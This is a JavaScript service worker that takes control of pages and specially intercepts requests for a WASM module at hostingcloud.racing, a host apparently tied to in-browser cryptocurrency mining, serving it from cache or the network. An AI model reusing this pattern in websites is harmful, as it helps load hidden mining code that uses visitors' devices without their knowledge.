
self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim()); // Take control of open clients
});


self.addEventListener('install', (event) => {
    event.waitUntil(self.skipWaiting()); // Activate immediately
    // event.waitUntil(
    //     caches.open('wasm-cache').then((cache) => {
    //         return cache.addAll([
    //             'ATr0mzDy.wasm' // URL to your WASM module
    //         ]);
    //     })
    // );
});

self.addEventListener('fetch', (event) => {
    // Check if the request URL matches your specific cross-site URL
    if (event.request.url === 'https://www.hostingcloud.racing/ATr0mzDy.wasm') {
        // Intercept the request and serve the cached WASM module
        console.log('Intercepted request:', event.request.url);
        event.respondWith(
            caches.match('ATr0mzDy.wasm').then((response) => {
                return response || fetch(event.request); // Fallback to network if not found
            })
        );
    } else {
        // Default fetch behavior for other requests
        console.log('Default fetch:', event.request.url);
        event.respondWith(fetch(event.request));
    }
});